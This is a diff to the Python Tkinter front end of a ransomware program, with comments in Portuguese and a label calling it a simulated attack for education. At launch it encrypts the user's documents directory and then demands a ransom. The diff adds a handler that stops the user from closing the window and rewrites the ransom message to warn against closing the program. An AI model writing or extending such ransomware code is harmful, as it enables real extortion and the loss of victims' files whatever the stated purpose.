@@ -15,8 +15,15 @@ class RansomwareGUI:
         self.label = tk.Label(master, text="WARNING: This program is a simulated ransomware attack for educational purposes only.")
         self.label.pack(pady=20)
 
+        #Esta funçao faz como que o user nao consiga fechar a janela
+        master.protocol("WM_DELETE_WINDOW", self.disable_event)
+
         # Chama a função para encriptar os arquivos assim que a interface é iniciada
         self.start_encryption()
+
+    def disable_event(self):
+        # Função para impedir o fecho da janela, nao faz nada
+        pass
 
     def start_encryption(self):
         # Função para iniciar a criptografia dos arquivos
@@ -24,7 +31,7 @@ class RansomwareGUI:
 
     def encrypt_files(self):
         encriptor.encrypt_documents_directory()
-        messagebox.showinfo("Encryption Complete", "Encryption completed. Pay the ransom to decrypt your files.")
+        messagebox.showinfo("Encryption Complete", "Encryption completed. Pay the ransom to decrypt your files and do not close this program!")
         # Cria um botão para iniciar o processo de descriptografia
         self.decrypt_button = tk.Button(self.master, text="Decrypt Files", command=self.start_decryption)
         self.decrypt_button.pack(pady=10)
@@ -41,7 +48,7 @@ class RansomwareGUI:
             messagebox.showinfo("Decryption Complete", "Decryption completed. Your files are now accessible.")
 
         except Exception:
-            messagebox.showerror("Error", f"Decryption failed: {Exception}")
+            messagebox.showerror("Error", "Decryption failed! Use other key")
 
 
 if __name__ == "__main__":
